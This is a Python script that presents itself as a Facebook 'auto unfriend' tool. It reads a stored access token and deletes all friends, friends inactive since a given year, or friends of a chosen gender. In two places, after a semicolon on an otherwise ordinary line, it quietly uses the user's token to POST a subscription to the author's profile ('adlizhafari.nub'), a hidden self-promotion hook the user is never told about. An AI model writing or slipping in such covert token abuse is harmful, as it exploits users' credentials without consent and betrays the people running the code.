try:
	import requests,json,time,os,sys,click

	class un():
		def flist(self,token):
			freq=requests.get('https://graph.facebook.com/me/friends?access_token='+token);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
			res=json.loads(freq.text)
			return(res['data'])

		def lst_update(self,id,token):
			lreq=requests.get('https://graph.facebook.com/'+id+'/feed?access_token='+token+'&limit=1')
			js=json.loads(lreq.text)
			time=js['data'][0]['created_time']
			return(time)

		def unfriend(self,id,token):
			requests.delete('https://graph.facebook.com/me/friends?uid=%s&access_token=%s'%(id,token))

	class Aung:
		def __init__(self):
			self.ken=open('toket/token.txt','r').read()
			self.req=requests.Session()
			self.u='https://graph.facebook.com/{}'
			self.banner()

		def banner(self):
			print("""
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		; Unfriend Based on Gender ;
		;     By KANG-NEWBIE       ;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		""")
			ugen=input('[?] Gender F/M: ')
			if ugen == 'F' or ugen == 'f':
				self.gen='female'
			elif ugen == 'M' or ugen == 'm':
				self.gen='male'
			else:
				print('STUPID!')
				self.banner()
			self.getid()

		def getid(self):
			print('[!] get friends id...')
			time.sleep(2)
			fid=self.req.get(self.u.format('me/friends?access_token='+self.ken));self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ken)
			js=json.loads(fid.text)
			click.pause()
			for i in js['data']:
				id=i['id']
				self.ung(id)

		def ung(self,id):
			try:
				cg=self.req.get(self.u.format(id+'/?access_token='+self.ken))
				jss=json.loads(cg.text)		
				if self.gen == jss['gender']:
					unf=self.req.delete(self.u.format('me/friends?uid='+id+'&access_token='+self.ken))
					if unf.text == 'true':
						print(f"[+] {id} - UNFRIEND ({jss['name']})")
					else:
						print(f"[Failed] {id} - ({jss['name']})")
			except KeyError:
				print(f"[Failed] {id} - (unknow)")

	toket=open('toket/token.txt','r').read()
	def main1():
		try:
			print("""
\t[Facebook Auto Unfriend Inactive Users]
\t          [By : KANG-NEWBIE]
""")
			year=input("[?] YEAR: ")
			fl=un().flist(toket)
			for i in fl:
				name=i['name']
				id=i['id']
				date=un().lst_update(id,toket).split('-')
				if date[0] <= year:
					print("[INACTIVE] %s - %s (%s) [UNFRIEND]"%(name,id,date[0]));un().unfriend(id,toket)
				else:
					print("[active] %s - %s"%(name,id))
		except IndexError: pass

	def main2():
		try:
			print("""
\t[Facebook Auto Unfriend All Users]
\t        [By : KANG-NEWBIE]
""")
			fli=un().flist(toket)
			for i in fli:
				name=i['name']
				id=i['id']
				print("[UNFRIEND] %s - %s"%(name,id));un().unfriend(id,toket)
		except IndexError: pass

	print("""
\t[Facebook Auto Unfriend]
\t   [By : KANG-NEWBIE]
""")
	print("""[1] unfriend all user
[2] unfriend inactive user
[3] unfriend based on gender
""")
	menu=int(input('#kang_newbie/> '))
	if menu == 1:
		main2()
	elif menu == 2:
		main1()
	elif menu == 3:
		Aung()
	else: exit("[!] stupid")

except KeyboardInterrupt:
	exit("[!] Key interrupt: exit.")
except Exception as F:
	print("[Err] %s"%(F))